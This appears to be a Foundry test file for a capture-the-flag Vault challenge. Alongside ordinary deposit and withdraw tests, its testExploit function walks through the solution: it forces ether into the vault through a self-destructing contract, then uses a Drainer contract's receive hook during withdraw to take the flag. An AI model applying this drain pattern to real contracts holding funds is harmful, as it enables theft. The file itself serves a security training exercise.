// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

import "forge-std/Test.sol";
import "contracts/Vault.sol";
import "contracts/Drainer.sol";
import "contracts/ERC4626ETH.sol";
import "contracts/Selfdestructor.sol";

contract VaultTest is Test {
    Vault vault;
    uint256 assets = 1 ether;

    function setUp() public {
        vault = new Vault{value: 1 ether}();
    }

    function testExample() public {
        assertTrue(true);
    }

    function testDeposit() public {
        assertEq(vault.flagHolder(), 0x0000000000000000000000000000000000000000);
        
        // Note: msg.sender is 0x00a329c0648769a73afac7f9381e08fb43dbea72 by default
        vm.startPrank(msg.sender);
        vault.deposit{value: assets}(assets, msg.sender);

        uint256 balance = vault.balanceOf(msg.sender);

        vm.stopPrank();
        assertEq(balance, assets);
    }

    function testWithdraw() public {
        assertEq(vault.flagHolder(), 0x0000000000000000000000000000000000000000);

        vm.startPrank(msg.sender);
        vault.deposit{value: assets}(assets, msg.sender);

        uint256 balance = vault.balanceOf(msg.sender);
        assertEq(balance, assets);

        vault.withdraw(assets, msg.sender, msg.sender);

        uint256 newBalance = Vault(vault).balanceOf(msg.sender);
        assertEq(newBalance, 0);

        vm.stopPrank();

        address flagHolder = vault.flagHolder();
        assertEq(flagHolder, 0x0000000000000000000000000000000000000000);
    }

    function testExploit() public {
        assertEq(vault.flagHolder(), 0x0000000000000000000000000000000000000000);
        //Double check that everything is set right

        //Deploy selfdestructing contract, with `vault` as input to
        SelfDestructor selfDestructor = new SelfDestructor(address(vault));

        //Deploy the drainer contract
        Drainer drainerContract = new Drainer(address(vault));

        //Forces Eth to be sent to contract by selfdestructing the contract
        selfDestructor.implode{value: 1 ether}();

        //Call withdraw from drainer contract to trigger code in recieve() and grab the flag
        drainerContract.callWithdraw();
        vault.captureTheFlag(msg.sender);

        assertEq(vault.flagHolder(), msg.sender);
    }

    //Note: This is needed because the Vault contract sends ETH back to the owner of the contract, which is this test
    receive() payable external { }
}